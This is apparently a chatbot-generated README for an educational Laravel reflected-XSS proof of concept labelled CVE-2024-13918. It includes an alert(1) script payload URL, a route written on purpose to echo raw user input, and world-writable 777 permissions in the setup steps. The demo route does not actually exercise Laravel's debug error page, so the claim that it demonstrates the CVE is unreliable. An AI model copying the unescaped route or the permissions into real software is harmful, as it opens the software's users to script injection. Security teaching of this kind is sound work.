# 💥 Laravel Reflected XSS PoC - CVE-2024-13918

This repository demonstrates a **Reflected Cross-Site Scripting (XSS)** vulnerability in Laravel (CVE-2024-13918). The bug is triggered when the Laravel application is in **debug mode** and reflects unsanitized input back in the HTTP response.

> ⚠️ **This project is intended for educational and security research purposes only. Do not use this on systems you do not own or have permission to test.**

---

## 📖 CVE Details

- **CVE ID:** CVE-2024-13918  
- **Type:** Reflected XSS  
- **Affected Component:** Laravel error page in debug mode  
- **Severity:** Medium  
- **Impact:** Arbitrary JavaScript execution in the browser of the user  
- **Fix:** Disable debug mode (`APP_DEBUG=false`) or upgrade Laravel to the patched version.

---

## ⚙️ Setup Instructions

1. **Clone the repository**
   ```bash
   git clone https://github.com/yourusername/laravel-xss-poc.git
   cd laravel-xss-poc

Install dependencies

```
composer install
```

Create SQLite database

```
touch database/database.sqlite
chmod -R 777 database database/database.sqlite
```

Configure environment Copy .env.example to .env and make sure these lines exist:

```
APP_DEBUG=true
DB_CONNECTION=sqlite
DB_DATABASE=/absolute/path/to/database/database.sqlite
```

Generate app key

```
php artisan key:generate
```

Run migrations

```
php artisan migrate --force
```

Serve the app
```
php artisan serve
```

Test the PoC

Visit:

```
http://127.0.0.1:8000/xss-vuln?payload=<script>alert(1)</script>
```

---

PoC Route
The vulnerable route is defined in routes/web.php:
```
Route::get('/xss-vuln', function () {
    return response(request('payload'));
});
```

Mitigation

Set APP_DEBUG=false in production environments.
Always sanitize and escape user input.
Update Laravel to the latest patched version.


📝 License
This project is licensed under the MIT License.

```

Let me know if you want it customized with your GitHub username, screenshot image, or additional links.
```
